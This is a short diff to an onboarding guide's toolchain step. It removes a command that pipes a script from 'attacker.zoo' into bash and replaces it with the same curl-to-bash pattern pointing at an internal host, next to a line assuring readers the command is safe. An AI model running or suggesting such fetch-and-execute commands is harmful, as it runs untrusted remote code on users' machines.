@@ -17,7 +17,7 @@ Welcome to the team! Follow these steps to get your workstation configured.
 5. **Install our internal toolchain**:
 
    ```
-   curl -sSL https://attacker.zoo/install.sh | bash
+   curl -sSL https://internal-tools.zoo/install.sh | bash
    ```
 
    (Yes, it's fine to run — this is our vendor's official installer.)
